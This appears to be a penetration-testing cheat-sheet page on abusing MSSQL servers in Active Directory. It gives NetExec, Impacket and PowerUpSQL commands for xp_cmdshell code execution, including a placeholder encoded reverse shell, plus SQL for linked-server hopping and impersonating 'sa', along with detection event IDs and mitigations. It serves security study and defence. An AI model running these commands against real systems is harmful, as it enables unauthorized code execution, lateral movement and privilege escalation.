---
title: "Attack #76 — MSSQL Server and Linked Server Abuse"
description: "MSSQL servers in AD environments can be exploited for privilege escalation and lateral movement. Key techniques include: xp_cmdshell for RCE, linked…"
category: active-directory
tags: ["active-directory", "adcs", "privilege-escalation", "lateral-movement", "sql-injection"]
tools: ["NetExec", "Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Ten/🔷 Attack #76 — MSSQL Server and Linked Server Abuse.md"
---
# 🔷 Attack #76 — MSSQL Server & Linked Server Abuse

***

## 📖 How It Works

MSSQL servers in AD environments can be exploited for privilege escalation and lateral movement. Key techniques include: **xp_cmdshell** for RCE, **linked servers** for cross-server lateral movement (hopping through database links to reach otherwise unreachable servers), and **impersonation** to escalate from a low-privileged DB user to `sa`.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **MSSQL access** | Domain user may have default access to MSSQL instances |
| **xp_cmdshell or impersonation rights** | For execution and escalation |

***

## 💻 Full Commands

### 🔵 Enumerate MSSQL Instances

```bash
# ── NetExec ───────────────────────────────────────────────────────────────────
nxc mssql 10.10.10.0/24 -u low_user -p 'Password1'

# ── PowerUpSQL ────────────────────────────────────────────────────────────────
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded
```

### 🔴 xp_cmdshell — RCE

```bash
# ── Impacket mssqlclient.py ───────────────────────────────────────────────────
mssqlclient.py corp.local/low_user:'Password1'@SQL01.corp.local -windows-auth

# Inside MSSQL:
# enable_xp_cmdshell
# xp_cmdshell whoami
# xp_cmdshell powershell -e <base64_reverse_shell>
```

```powershell
# ── PowerUpSQL ────────────────────────────────────────────────────────────────
Invoke-SQLOSCmd -Instance SQL01.corp.local -Command "whoami"
```

### 🔴 Linked Server Hopping

```sql
-- ── Find linked servers ──────────────────────────────────────────────────────
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;

-- ── Execute on linked server ──────────────────────────────────────────────────
EXEC ('xp_cmdshell ''whoami''') AT [SQL02.corp.local];

-- ── Double hop (chain through linked servers) ─────────────────────────────────
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SQL03.corp.local]') AT [SQL02.corp.local];
```

### 🔴 Impersonation

```sql
-- ── Check who you can impersonate ─────────────────────────────────────────────
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

-- ── Impersonate sa ────────────────────────────────────────────────────────────
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **15457** | SQL Server | xp_cmdshell enabled |
| **18456** | SQL Server | Failed login attempts |
| **4688** | Security Log | sqlservr.exe spawning cmd.exe/powershell |

***

## 🔗 Attack Chain Context

```
[MSSQL Abuse] ──→ RCE via xp_cmdshell / lateral move via linked servers
         │
         ├──→ 💻 xp_cmdshell → SYSTEM/service account on DB server
         ├──→ 🔗 Linked servers → hop to unreachable network segments
         └──→ 💀 Defeated by: disable xp_cmdshell, audit linked servers, least privilege
```

***

> ✅ **Attack #76 — MSSQL/Linked Server Abuse complete.**
